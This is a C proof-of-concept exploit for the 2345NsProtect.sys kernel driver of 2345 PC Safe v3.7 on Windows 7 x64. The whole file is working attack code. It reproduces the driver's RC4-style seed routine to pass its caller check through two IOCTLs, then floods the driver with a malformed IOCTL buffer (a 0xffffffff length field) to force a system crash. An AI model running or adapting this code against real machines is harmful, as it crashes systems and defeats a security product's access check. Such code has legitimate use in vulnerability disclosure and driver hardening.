/*
# Exploit Author : anhkgg
# Vendor Homepage : http://safe.2345.cc/
# Software Link : http://dl.2345.cc/2345pcsafe/2345pcsafe_v3.7.0.9345.exe
# Version : v3.7
# Tested on : Windows 7 x64
# Date : 2018-5-11
#
# BSOD caused of 2345NsProtect.sys because of not validating input valuesi1 / 4test version 3.7 on windows 7 x64 platform
#
#
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

struct NETFW_IOCTL_ADD_PID
{
	DWORD pid;
	char seed[0x14];//4 + 14
};//0x18

struct NETFW_IOCTL_SET_PID
{
	BYTE set_state;//
	BYTE unk;//1
	WORD buf_len;//2
	DWORD pid;//4
	char buf[0x64];//8 
};//6c

int __stdcall f_XOR__12A30(BYTE *a1, BYTE *a2)
{
	int result;

	*a1 ^= *a2;
	*a2 ^= *a1;
	result = (unsigned __int8)*a2;
	*a1 ^= result;
	return result;
}

int __stdcall sub_12A80(char *a1, int len, char *a3)
{
	int result;
	unsigned __int8 v4;
	__int16 i;
	__int16 j;
	unsigned __int8 k;

	for (i = 0; i < 256; ++i)
		a3[i] = i;
	a3[256] = 0;
	a3[257] = 0;
	k = 0;
	v4 = 0;
	result = 0;
	for (j = 0; j < 256; ++j)
	{
		v4 += a3[j] + a1[k];
		f_XOR__12A30((BYTE*)&a3[j], (BYTE*)&a3[v4]);
		result = (k + 1) / len;
		k = (k + 1) % len;
	}
	return result;
}

char *__stdcall sub_12B60(char *a1, signed int len, char *a3)
{
	char *result;
	__int16 i;
	unsigned __int8 v5;
	unsigned __int8 v6;

	v5 = a3[256];
	v6 = a3[257];
	for (i = 0; i < len; ++i)
	{
		v6 += a3[++v5];
		f_XOR__12A30((BYTE*)&a3[v5], (BYTE*)&a3[v6]);
		a1[i] ^= a3[(unsigned __int8)(a3[v6] + a3[v5])];
	}
	a3[256] = v5;
	result = a3;
	a3[257] = v6;
	return result;
}

void calc_seed(char* seed, char* dst)
{
	char Source1[26] = { 0 };
	char a3[300] = { 0 };

	Source1[0] = 8;
	Source1[1] = 14;
	Source1[2] = 8;
	Source1[3] = 10;
	Source1[4] = 2;
	Source1[5] = 3;
	Source1[6] = 29;
	Source1[7] = 23;
	Source1[8] = 13;
	Source1[9] = 3;
	Source1[10] = 15;
	Source1[11] = 22;
	Source1[12] = 15;
	Source1[13] = 7;
	Source1[14] = 91;
	Source1[15] = 4;
	Source1[16] = 18;
	Source1[17] = 26;
	Source1[18] = 26;
	Source1[19] = 3;
	Source1[20] = 4;
	Source1[21] = 1;
	Source1[22] = 15;
	Source1[23] = 25;
	Source1[24] = 10;
	Source1[25] = 13;

	sub_12A80(seed, 0x14, a3);        
	sub_12B60(Source1, 0x1A, a3);
	memcpy(dst, Source1, 26);
}

BOOL BypassChk(HANDLE h)
{
	DWORD BytesReturned = 0;

	DWORD ctlcode = 0x222298;
	NETFW_IOCTL_ADD_PID add_pid = { 0 };
	add_pid.pid = GetCurrentProcessId();

	if (!DeviceIoControl(h, ctlcode, &add_pid, sizeof(NETFW_IOCTL_ADD_PID), &add_pid, sizeof(NETFW_IOCTL_ADD_PID), &BytesReturned, NULL)) {
		printf("[-] DeviceIoControl %x error: %d\n", ctlcode, GetLastError());
		return FALSE;
	}

	ctlcode = 0x2222A4;
	NETFW_IOCTL_SET_PID set_pid = { 0 };
	set_pid.pid = GetCurrentProcessId();
	set_pid.set_state = 1;

	calc_seed(add_pid.seed, set_pid.buf);
	set_pid.buf_len = 26;

	if (!DeviceIoControl(h, ctlcode, &set_pid, sizeof(NETFW_IOCTL_SET_PID), &set_pid, sizeof(NETFW_IOCTL_SET_PID), &BytesReturned, NULL)) {
		printf("[-] DeviceIoControl %x error: %d\n", ctlcode, GetLastError());
		return FALSE;
	}

	return TRUE;
}

HANDLE OpenDevice(char* path)
{
	return CreateFileA(path,
		GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}

int poc_2345NetFirewall()
{
	
	DWORD BytesReturned = 0;

	HANDLE h = OpenDevice("\\\\.\\2345NsProtect");
	if (h == INVALID_HANDLE_VALUE) {
		printf("[-] Open device error: %d\n", GetLastError());
		return 1;
	}

	if (!BypassChk(h)) {
		printf("[-] error!");
		return 1;
	}
	
	//BSOD
	DWORD ctlcode = 0x8000200D;

#pragma pack(push,1)
	struct _ioctl_buf_in
	{
		DWORD len1;
		DWORD len2;//4
		char buf[0x1C];//8 len1+len2
	};//24
#pragma pack(pop)

	_ioctl_buf_in buff = { 0 };
	buff.len1 = 0xffffffff;
	buff.len2 = 1;
	memset(buff.buf, 0x41, 0x1c);
	int size = 0x23C;

	for (int i = 0; i < 0x1000; i++) {
		if (!DeviceIoControl(h, ctlcode, &buff, size, &buff, size, &BytesReturned, NULL)) {
			//printf("[-] DeviceIoControl %x error: %d\n", ctlcode, GetLastError());
		}
	}
		
	return 0;
}

int main()
{
	poc_2345NetFirewall();

	printf("poc failed!\n");

	getchar();
		
	return 0;
}